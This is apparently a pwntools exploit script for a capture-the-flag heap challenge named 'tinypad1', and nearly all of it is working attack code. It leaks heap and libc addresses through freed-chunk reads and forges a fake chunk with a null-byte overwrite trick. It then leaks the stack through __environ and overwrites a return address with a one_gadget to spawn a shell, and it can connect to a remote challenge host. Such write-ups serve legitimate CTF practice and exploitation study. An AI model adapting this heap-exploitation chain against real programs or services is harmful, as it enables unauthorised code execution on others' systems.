#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './tinypad1'

context.os = 'linux'
context.log_level = 'debug'
if arch == 64:
    context.arch = 'amd64'
if arch == 32:
    context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    # gdb.attach(p, "b *$rebase(0xDB4C)\nb *$rebase()")
    # pause()


def add(size, content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(size))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)


def delete(index):

    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))


def edit(index, content, ok=True):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)
    p.recvuntil("(Y/n)>>> ")
    if ok:
        p.sendline("Y")
    else:
        p.sendline("n")


# stage one
add(0x80, "A"*0x80)  # * 1
add(0x80, "B"*0x80)  # * 2
add(0x80, "C"*0x80)  # * 3
add(0x80, "D"*0x80)  # * 4

delete(3)
delete(1)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
heapbase = u64(p.recvline().rstrip().ljust(8, b"\x00")) - 0x120
log.info("heapbase: %s" % hex(heapbase))
p.recvuntil(" #   INDEX: 3\n")
p.recvuntil(" # CONTENT: ")
main_arena = u64(p.recv(6).ljust(8, b"\x00")) - 0x58
log.info("main_arena: %s" % hex(main_arena))


delete(2)
delete(4)

# stage two
add(0x18, "A"*0x18)
add(0x100, b"B"*0xf8 + p64(0x11))
add(0x100, "C"*0xf8)
add(0x100, "D"*0xf8)


tinypad = 0x602040
offset = heapbase + 0x20 - 0x602040 - 0x20
fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2

edit(3, b"D"*0x20 + fake_chunk) #! p64(0) 截断

zero_byte_number = 8 - len(p64(offset).strip(b"\x00")) #* 6
#! 绕过 \x00
for i in range(zero_byte_number+1):
    data = b"A"*0x10 + p64(offset).strip(b"\x00").rjust(8-i, b'f')
    edit(1, data)

#* prev_size = offset

delete(2)

edit(4, b"D"*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2) #! 改 unsorted 的 size


# stage three
libc_base = main_arena + 88 - 0x3c4b78
log.info("libc_base: %s" % hex(libc_base))
one_gadget = libc_base + 0x45216
environ_pointer = libc_base + libc.symbols['__environ']

add(0xf0, b"A"*0xd0 + p64(8) + p64(environ_pointer) + b'a'*8 + p64(0x602148))

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")

main_ret = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x8*30
log.info("environ_addr: %s" % hex(main_ret))
edit(2, p64(main_ret))
edit(1, p64(one_gadget))
debug()
p.interactive()
